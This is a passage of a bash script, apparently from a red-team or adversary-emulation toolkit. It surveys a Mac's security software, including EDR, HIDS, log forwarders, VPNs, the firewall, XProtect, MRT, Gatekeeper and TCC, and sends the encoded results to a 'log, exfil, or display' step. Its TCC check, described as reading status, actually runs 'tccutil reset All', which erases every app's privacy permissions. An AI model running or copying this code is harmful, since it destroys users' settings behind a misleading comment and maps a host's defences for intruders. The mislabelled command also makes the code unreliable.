        if [[ "$path" != *"*" ]] && [ -d "$path" ]; then
            output+="Log Forwarder directory: $path\n"
            output+="Directory contents: $(ls -la "$path" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for Log Forwarder launch agents and daemons
check_log_forwarder_launch_files() {
    core_debug_print "Checking for Log Forwarder-related launch agents and daemons"
    local output=""
    output+="[Log Forwarder Launch Files]\n"
    
    # Create pattern from Log Forwarder patterns
    local pattern=$(IFS="|"; echo "${LOG_FORWARDER_PATTERNS[*]}")
    local found_launch=false
    
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            local matched_launches=$(find "$loc" -type f -name "*.plist" 2>/dev/null | grep -iE "$pattern")
            if [ -n "$matched_launches" ]; then
                found_launch=true
                output+="Found Log Forwarder-related launch files in $loc:\n"
                output+="$matched_launches\n\n"
                
                # Just report the file paths without showing contents
                output+="Found launch files related to log forwarders\n"
            fi
        fi
    done
    
    if [ "$found_launch" = false ]; then
        output+="No Log Forwarder-related launch agents/daemons found\n\n"
    fi
    
    echo "$output"
}

# Main Log Forwarder detection function
discover_log_forwarders() {
    core_debug_print "Checking for Log Forwarders"
    local output=""
    local discover_type="$1"  # Can be used to specify a particular check
    
    case "$discover_type" in
        ps)
            # Check for Log Forwarder processes only
            output+=$(check_log_forwarder_processes)
            ;;
        files)
            # Check for Log Forwarder files only
            output+=$(check_log_forwarder_files)
            ;;
        dir)
            # Check for Log Forwarder directories only
            output+=$(check_log_forwarder_directories)
            ;;
        launch)
            # Check for Log Forwarder launch files only
            output+=$(check_log_forwarder_launch_files)
            ;;
        all|*)
            # Run all Log Forwarder checks
            output+=$(check_log_forwarder_processes)
            output+=$(check_log_forwarder_files)
            output+=$(check_log_forwarder_directories)
            output+=$(check_log_forwarder_launch_files)
            ;;
    esac
    
    # Add a summary if we found anything
    if echo "$output" | grep -q "found\|Log Forwarder\|detected\|splunk\|fluentd\|td-agent"; then
        output+="\n[Summary]\nLog Forwarders detected on this system.\n"
    else
        output+="\n[Summary]\nNo common Log Forwarders detected.\n"
    fi
    
    echo "$output"
}

#------------------------------------------------------------------------------
# VPN Detection Functions
#------------------------------------------------------------------------------

# Check for VPN processes
# BAD CODE BLOCK: Duplicates process checking logic again
# IMPROVED IMPLEMENTATION:
check_vpn_processes() {
    core_debug_print "Checking for VPN processes"
    local output=""
    output+="[VPN Process Detection]\n"
    
    # Use the helper function to check for VPN processes
    local vpn_process_results=$(check_processes_by_list "${VPN_PROCESSES[@]}")
    
    if [ -n "$vpn_process_results" ]; then
        output+="$vpn_process_results\n"
    else
        output+="No VPN processes detected\n\n"
    fi
    
    # Check for vendor process pairs
    output+="\n[VPN Processes by Vendor]\n"
    local vendor_results=$(check_processes_by_vendor "${VPN_VENDOR_PROC[@]}")
    
    if [ -n "$vendor_results" ]; then
        output+="$vendor_results\n"
    else
        output+="No VPN vendor processes detected\n\n"
    fi
    
    echo "$output"
}

# Check for VPN files
check_vpn_files() {
    core_debug_print "Checking for VPN files"
    local output=""
    output+="[VPN File Detection]\n"
    
    for path in "${VPN_PATHS[@]}"; do
        # Handle wildcard paths
        if [[ "$path" == *"*" ]]; then
            # For wildcards, use find with pattern
            local base_path="${path%/*}"
            local pattern="${path##*/}"
            
            if [ -d "$base_path" ]; then
                local found_files=$(find "$base_path" -name "$pattern" -type f 2>/dev/null)
                if [ -n "$found_files" ]; then
                    output+="VPN file pattern: $path\n"
                    output+="$found_files\n\n"
                fi
            fi
        elif [ -f "$path" ]; then
            output+="VPN file: $path\n"
            output+="File info: $(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    # Check for VPN applications
    for app in "${VPN_APP[@]}"; do
        if [ -d "/Applications/$app" ]; then
            output+="VPN application: $app\n"
            output+="$(ls -la "/Applications/$app" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for VPN directories
check_vpn_directories() {
    core_debug_print "Checking for VPN directories"
    local output=""
    output+="[VPN Directory Detection]\n"
    
    for path in "${VPN_PATHS[@]}"; do
        # Skip wildcard patterns and check only directories
        if [[ "$path" != *"*" ]] && [ -d "$path" ]; then
            output+="VPN directory: $path\n"
            output+="Directory contents: $(ls -la "$path" 2>/dev/null | head -5)\n\n"
        fi
    done
    
    echo "$output"
}

# Check for VPN kernel extensions
check_vpn_kexts() {
    core_debug_print "Checking for VPN-related kernel extensions"
    local output=""
    output+="[VPN Kernel Extensions]\n"
    
    # Create pattern from VPN patterns
    local pattern=$(IFS="|"; echo "${VPN_PATTERNS[*]}")
    local kext_result=$(kextstat 2>/dev/null | grep -iE "$pattern")
    
    if [ -n "$kext_result" ]; then
        output+="VPN kernel extensions found:\n"
        output+="$kext_result\n\n"
    else
        output+="No VPN-related kernel extensions found\n\n"
    fi
    
    echo "$output"
}

# Check for VPN launch agents and daemons
check_vpn_launch_files() {
    core_debug_print "Checking for VPN-related launch agents and daemons"
    local output=""
    output+="[VPN Launch Files]\n"
    
    # Create pattern from VPN patterns
    local pattern=$(IFS="|"; echo "${VPN_PATTERNS[*]}")
    local found_launch=false
    
    for loc in "${LAUNCH_PATHS[@]}"; do
        if [ -d "$loc" ]; then
            local matched_launches=$(find "$loc" -type f -name "*.plist" 2>/dev/null | grep -iE "$pattern")
            if [ -n "$matched_launches" ]; then
                found_launch=true
                output+="Found VPN-related launch files in $loc:\n"
                output+="$matched_launches\n\n"
            fi
        fi
    done
    
    if [ "$found_launch" = false ]; then
        output+="No VPN-related launch agents/daemons found\n\n"
    fi
    
    echo "$output"
}

# Main VPN detection function
discover_vpn() {
    core_debug_print "Checking for VPN solutions"
    local output=""
    local discover_type="$1"  # Can be used to specify a particular check
    
    case "$discover_type" in
        ps)
            # Check for VPN processes only
            output+=$(check_vpn_processes)
            ;;
        files)
            # Check for VPN files only
            output+=$(check_vpn_files)
            ;;
        dir)
            # Check for VPN directories only
            output+=$(check_vpn_directories)
            ;;
        kext)
            # Check for VPN kernel extensions only
            output+=$(check_vpn_kexts)
            ;;
        launch)
            # Check for VPN launch files only
            output+=$(check_vpn_launch_files)
            ;;
        all|*)
            # Run all VPN checks
            output+=$(check_vpn_processes)
            output+=$(check_vpn_files)
            output+=$(check_vpn_directories)
            output+=$(check_vpn_kexts)
            output+=$(check_vpn_launch_files)
            ;;
    esac
    
    # Add a summary if we found anything
    if echo "$output" | grep -q "found\|VPN\|detected\|cisco\|openvpn\|wireguard"; then
        output+="\n[Summary]\nVPN solutions detected on this system.\n"
    else
        output+="\n[Summary]\nNo common VPN solutions detected.\n"
    fi
    
    echo "$output"
}

# Check Application Firewall
discover_firewall() {
    core_debug_print "Checking Application Firewall"
    local output=""
    local cmd_socketfilterfw="/usr/libexec/ApplicationFirewall/socketfilterfw"
    
    # Check if socketfilterfw exists
    if [ ! -x "$cmd_socketfilterfw" ]; then
        output+="[Firewall]\nApplication Firewall utility not found at $cmd_socketfilterfw\n"
        echo "$output"
        return
    fi
    
    # Get firewall state
    output+="[Firewall Status]\n"
    output+="$($cmd_socketfilterfw --getglobalstate 2>/dev/null)\n\n"
    
    # Get logging mode
    output+="[Firewall Logging]\n"
    output+="$($cmd_socketfilterfw --getloggingmode 2>/dev/null)\n\n"
    
    # Get stealth mode
    output+="[Firewall Stealth Mode]\n"
    output+="$($cmd_socketfilterfw --getstealthmode 2>/dev/null)\n\n"
    
    # List allowed applications
    output+="[Firewall Allowed Applications]\n"
    output+="$($cmd_socketfilterfw --listapps 2>/dev/null)\n"
    
    echo "$output"
}

# Check HIDS (Host Intrusion Detection System)
discover_hids() {
    core_debug_print "Checking for HIDS"
    local output=""
    
    # Common HIDS process names
    local hids_processes="ossec wazuh samhain aide tripwire osquery auditd"
    
    # Check running processes
    output+="[HIDS Processes]\n"
    for proc in $hids_processes; do
        local proc_result=$(ps -axrww | grep -v grep | grep -i "$proc" 2>/dev/null)
        if [ -n "$proc_result" ]; then
            output+="Found HIDS process: $proc\n$proc_result\n\n"
        fi
    done
    
    # Check for HIDS paths
    output+="\n[HIDS Paths]\n"
    local hids_paths="/var/ossec /var/log/ossec /var/log/wazuh /etc/samhain /etc/aide /etc/tripwire"
    for path in $hids_paths; do
        if [ -d "$path" ] || [ -f "$path" ]; then
            output+="Found HIDS path: $path\n"
            output+="$(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    echo "$output"
}

# Check XProtect
discover_xprotect() {
    core_debug_print "Checking XProtect"
    local output=""
    local cmd_defaults="/usr/bin/defaults"
    
    # Check for XProtect paths
    output+="[XProtect Paths]\n"
    local xprotect_paths="/Library/Apple/System/Library/CoreServices/XProtect.bundle /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist"
    for path in $xprotect_paths; do
        if [ -d "$path" ] || [ -f "$path" ]; then
            output+="Found XProtect path: $path\n"
            output+="$(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    # Check XProtect version
    output+="\n[XProtect Status]\n"
    if [ -f "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.meta.plist" ]; then
        output+="XProtect meta plist found\n"
    else
        output+="XProtect meta plist not found\n\n"
    fi
    
    # Check for XProtect entries
    if [ -f "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist" ]; then
        output+="XProtect definitions found\n"
    else
        output+="XProtect definitions not found\n"
    fi
    
    echo "$output"
}

# Check MRT (Malware Removal Tool)
discover_mrt() {
    core_debug_print "Checking Malware Removal Tool"
    local output=""
    local cmd_defaults="/usr/bin/defaults"
    
    # Check for MRT paths
    output+="[MRT Paths]\n"
    local mrt_paths="/Library/Apple/System/Library/CoreServices/MRT.app /System/Library/CoreServices/MRT.app"
    for path in $mrt_paths; do
        if [ -d "$path" ]; then
            output+="Found MRT path: $path\n"
            output+="$(ls -la "$path" 2>/dev/null)\n\n"
        fi
    done
    
    # Check MRT version
    output+="\n[MRT Status]\n"
    if [ -f "/System/Library/CoreServices/MRT.app/Contents/version.plist" ]; then
        output+="MRT version plist found\n\n"
    else
        output+="MRT version plist not found\n\n"
    fi
    
    # Check if MRT is running
    output+="\n[MRT Processes]\n"
    local mrt_process=$(ps -axrww | grep -v grep | grep -i "MRT" 2>/dev/null)
    if [ -n "$mrt_process" ]; then
        output+="Found MRT process:\n$mrt_process\n\n"
    else
        output+="No MRT process found\n\n"
    fi
    
    echo "$output"
}

# Check Gatekeeper
 # SECURITY NOTE: The 'spctl' binary requires the calling application to be code signed
    # When executed from an unsigned script or app, macOS will prompt for admin authentication
    # This is a Gatekeeper security feature to prevent unauthorized access to system security settings
    # To prevent prompts, ensure this script is properly code signed with appropriate entitlements
    
discover_gatekeeper() {
    core_debug_print "Checking Gatekeeper"
    local output=""
    local cmd_spctl="/usr/sbin/spctl"
    
    # Check if spctl exists
    if [ ! -x "$cmd_spctl" ]; then
        output+="[Gatekeeper]\nGatekeeper utility not found at $cmd_spctl\n"
        echo "$output"
        return
    fi
    
   
    # Get Gatekeeper status
    output+="[Gatekeeper Status]\n"
    output+="$($cmd_spctl --status 2>/dev/null)\n\n"
    
    # Get assessment settings
    output+="[Gatekeeper Assessment]\n"
    output+="$($cmd_spctl --list 2>/dev/null)\n\n"
    
    # Get enabled assessments
    output+="[Gatekeeper Enabled Assessments]\n"
    output+="$($cmd_spctl --list --enabled 2>/dev/null)\n"
    
    echo "$output"
}

# Check TCC (Transparency, Consent, and Control)
discover_tcc() {
    core_debug_print "Checking TCC"
    local output=""
    local cmd_tccutil="/usr/bin/tccutil"
    
    # Check if tccutil exists
    if [ ! -x "$cmd_tccutil" ]; then
        output+="[TCC]\nTCC utility not found at $cmd_tccutil\n"
        echo "$output"
        return
    fi
    
    # Get TCC database path
    output+="[TCC Database]\n"
    local tcc_db_path="/Library/Application Support/com.apple.TCC/TCC.db"
    if [ -f "$tcc_db_path" ]; then
        output+="TCC database found at $tcc_db_path\n"
        output+="$(ls -la "$tcc_db_path" 2>/dev/null)\n\n"
    else
        output+="TCC database not found at $tcc_db_path\n\n"
    fi
    
    # Try to get TCC status
    output+="[TCC Status]\n"
    output+="$($cmd_tccutil reset All 2>&1 | grep -v "Usage")\n"
    
    echo "$output"
}

# Main security software detection orchestration function
# Calls the appropriate specific detection functions based on command-line arguments
run_security_detection() {
    local results=""
    
    # Organize our checks into logical groups:
    
    # Group 1: Endpoint Protection Software (EDR, AV, HIDS)
    if [ "$CHECK_EDR" = true ]; then
        core_debug_print "Running EDR-specific check with type: $EDR_CHECK_TYPE"
        local edr_results=$(discover_edr "$EDR_CHECK_TYPE")
        results+="$edr_results\n\n"
    fi
    
    if [ "$CHECK_AV" = true ]; then
        core_debug_print "Running antivirus detection"
        local av_results=$(discover_av)
        results+="$av_results\n\n"
    fi
    
    if [ "$CHECK_HIDS" = true ]; then
        core_debug_print "Running HIDS detection"
        local hids_results=$(discover_hids)
        results+="$hids_results\n\n"
    fi
    
    # Group 2: MacOS Security Tools (Objective-See, etc.)
    if [ "$CHECK_OST" = true ]; then
        core_debug_print "Running Objective-See tools detection"
        local ost_results=$(detect_objective_see_tools)
        results+="$ost_results\n\n"
    fi
    
    # Group 3: Infrastructure Tools (Log Forwarders, VPNs)
    if [ "$CHECK_LOG_FORWARDER" = true ]; then
        core_debug_print "Running Log Forwarder detection"
        local log_forwarder_results=$(discover_log_forwarders)
        results+="$log_forwarder_results\n\n"
    fi
    
    if [ "$CHECK_VPN" = true ]; then
        core_debug_print "Running VPN detection"
        local vpn_results=$(discover_vpn)
        results+="$vpn_results\n\n"
    fi
    
    # Group 4: Built-in macOS Security Features
    if [ "$CHECK_FIREWALL" = true ]; then
        core_debug_print "Running firewall detection"
        local firewall_results=$(discover_firewall)
        results+="$firewall_results\n\n"
    fi
    
    if [ "$CHECK_XPROTECT" = true ]; then
        core_debug_print "Running XProtect detection"
        local xprotect_results=$(discover_xprotect)
        results+="$xprotect_results\n\n"
    fi
    
    if [ "$CHECK_MRT" = true ]; then
        core_debug_print "Running Malware Removal Tool detection"
        local mrt_results=$(discover_mrt)
        results+="$mrt_results\n\n"
    fi
    
    if [ "$CHECK_GATEKEEPER" = true ]; then
        core_debug_print "Running Gatekeeper detection"
        local gatekeeper_results=$(discover_gatekeeper)
        results+="$gatekeeper_results\n\n"
    fi
    
    if [ "$CHECK_TCC" = true ]; then
        core_debug_print "Running TCC detection"
        local tcc_results=$(discover_tcc)
        results+="$tcc_results\n\n"
    fi
    
    # If no specific check was requested, display help information
    if [ "$CHECK_EDR" = false ] && [ "$CHECK_AV" = false ] && [ "$CHECK_OST" = false ] && \
       [ "$CHECK_FIREWALL" = false ] && [ "$CHECK_HIDS" = false ] && [ "$CHECK_XPROTECT" = false ] && \
       [ "$CHECK_MRT" = false ] && [ "$CHECK_GATEKEEPER" = false ] && [ "$CHECK_TCC" = false ] && \
       [ "$CHECK_LOG_FORWARDER" = false ] && [ "$CHECK_VPN" = false ] && \
       [ "$TEST_MODE" = false ]; then
        results+="No specific security check was requested. Use --all or specific check options.\n"
        results+="Run with --help for more information.\n"
    fi
    
    echo "$results"
}

# Main function
core_main() {
    local raw_output=""
    local processed_output=""
    
    # Parse command line arguments
    core_parse_arguments "$@"
    
    # Display help if requested
    if [ "$SHOW_HELP" = true ]; then
        core_display_help
        return 0
    fi
    
    # Validate required commands
    core_validate_commands || exit 1
    
    # Initialize the log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        # Initialize logging at start
        core_log_output "Starting ${NAME}" "started" true
    fi
    
    # If in test mode, execute the test ls command
    if [ "$TEST_MODE" = true ]; then
        core_debug_print "Running in test mode"
        
        # Get raw output from test command
        raw_output=$(core_list_files)
    else
        # Run security software detection
        core_debug_print "Running security software detection"
        raw_output=$(run_security_detection)
    fi
    
    # Debug checks
    if [ "$DEBUG" = true ]; then
        if [ -z "$raw_output" ]; then
            $CMD_PRINTF "[DEBUG] [%s] WARNING: Command produced no output\n" "$(core_get_timestamp)" >&2
        else
            $CMD_PRINTF "[DEBUG] [%s] Raw output size: %d bytes\n" "$(core_get_timestamp)" "${#raw_output}" >&2
        fi
    fi
    
    # Process the output (format, encode, encrypt)
    processed_output=$(core_process_output "$raw_output" "security_software")
    
    # Debug check processed output
    if [ "$DEBUG" = true ]; then
        if [ -z "$processed_output" ]; then
            $CMD_PRINTF "[DEBUG] [%s] WARNING: Processed output is empty\n" "$(core_get_timestamp)" >&2
        else
            $CMD_PRINTF "[DEBUG] [%s] Processed output size: %d bytes\n" "$(core_get_timestamp)" "${#processed_output}" >&2
        fi
    fi
    
    # Handle the final output (log, exfil, or display)
    core_transform_output "$processed_output"
}

# Exit silently if no args
if [ "$#" -eq 0 ]; then
    exit 0
fi

# Execute main function with all arguments
core_main "$@" 